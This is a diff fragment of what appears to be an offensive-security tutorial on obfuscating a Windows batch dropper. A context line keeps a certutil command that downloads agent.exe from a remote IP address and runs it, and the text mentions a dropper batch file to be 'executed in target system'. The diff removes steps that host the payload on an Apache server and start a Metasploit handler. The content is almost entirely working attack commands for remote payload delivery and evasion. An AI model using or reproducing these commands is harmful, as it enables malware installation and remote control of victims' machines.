@@ -217,19 +217,6 @@ The above string can be obfuscated using the **batch special character: "** <br 
 - String command to obfuscate<br />
 `cmd.exe /c certutil.exe -urlcache -split -f http://192.168.1.71/agent.exe agent.exe && start agent.exe`<br />
 
-<br />
-
-      1º - Store your agent.exe into your apache webroot (linux)
-      cp agent.exe /var/www/html/agent.exe
-
-      2º - Start apache2 webserver (linux)
-      service apache2 start
-
-      3º - Start your agent listenner (handler)
-      msfconsole -x 'use exploit/multi/hadler; set payload <payload>; set lhost <lhost>; set lport <lport>; run'
-
-<br />
-
 - File **certutil-dropper.bat** to be executed in target system
 
       @echo off
